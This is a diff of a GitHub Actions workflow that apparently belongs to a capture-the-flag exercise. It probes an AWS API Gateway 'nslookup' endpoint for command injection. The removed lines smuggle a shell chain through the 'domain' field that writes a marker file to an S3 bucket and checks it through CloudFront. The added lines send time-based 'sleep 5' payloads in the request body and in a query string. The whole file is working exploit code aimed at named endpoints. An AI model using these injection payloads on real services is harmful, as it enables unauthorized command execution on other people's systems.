@@ -1,4 +1,4 @@
-name: Stage2-10-Command-Injection-Probe
+name: Stage2-11-Confirm-Domain-Injection
 
 on:
   push:
@@ -10,14 +10,8 @@ permissions:
   id-token: write
 
 jobs:
-  probe:
+  timing:
     runs-on: ubuntu-latest
-
-    env:
-      AWS_REGION: us-east-1
-      API_ID: 3q931syi7b
-      SITE_BUCKET: site781fe43f26b9eba3
-      SITE_DOMAIN: d4ysu55xg7wfi.cloudfront.net
 
     steps:
       - name: Configure AWS credentials
@@ -30,17 +24,17 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Execute controlled shell-injection probe
+      - name: Run timing probes
         run: |
           python3 - <<'PY'
           import os
+          import time
           import requests
           from requests_aws4auth import AWS4Auth
 
-          api = (
-              "https://"
-              + os.environ["API_ID"]
-              + ".execute-api.us-east-1.amazonaws.com/dev/nslookup"
+          base = (
+              "https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
+              "/dev/nslookup"
           )
 
           auth = AWS4Auth(
@@ -51,37 +45,39 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          domain = (
-              "example.com; "
-              "printf CTF_PROBE > /tmp/ctf_probe; "
-              "/opt/aws s3api put-object "
-              "--bucket site781fe43f26b9eba3 "
-              "--key ctf-probe.txt "
-              "--body /tmp/ctf_probe "
-              "--region us-east-1 "
-              "--endpoint-url https://s3.us-east-1.amazonaws.com"
-          )
+          tests = [
+              (
+                  "baseline_body",
+                  base,
+                  {"domain": "example.com"}
+              ),
+              (
+                  "sleep_body",
+                  base,
+                  {"domain": "example.com; sleep 5"}
+              ),
+              (
+                  "sleep_query",
+                  base + "?domain=example.com%3B%20sleep%205",
+                  {}
+              )
+          ]
 
-          response = requests.post(
-              api,
-              json={"domain": domain},
-              auth=auth,
-              timeout=40
-          )
+          for name, url, body in tests:
+              start = time.monotonic()
 
-          print(f"HTTP={response.status_code}")
-          print(response.text)
+              response = requests.post(
+                  url,
+                  json=body,
+                  auth=auth,
+                  timeout=20
+              )
+
+              elapsed = time.monotonic() - start
+
+              print(f"TEST={name}")
+              print(f"HTTP={response.status_code}")
+              print(f"ELAPSED={elapsed:.2f}")
+              print(response.text)
+              print("---")
           PY
-
-      - name: Check marker through CloudFront
-        run: |
-          curl --silent --show-error \
-            --location \
-            --max-time 20 \
-            --output /tmp/marker \
-            --write-out "HTTP=%{http_code} SIZE=%{size_download}\n" \
-            "https://${SITE_DOMAIN}/ctf-probe.txt"
-
-          echo "Marker contents:"
-          head -c 200 /tmp/marker || true
-          echo
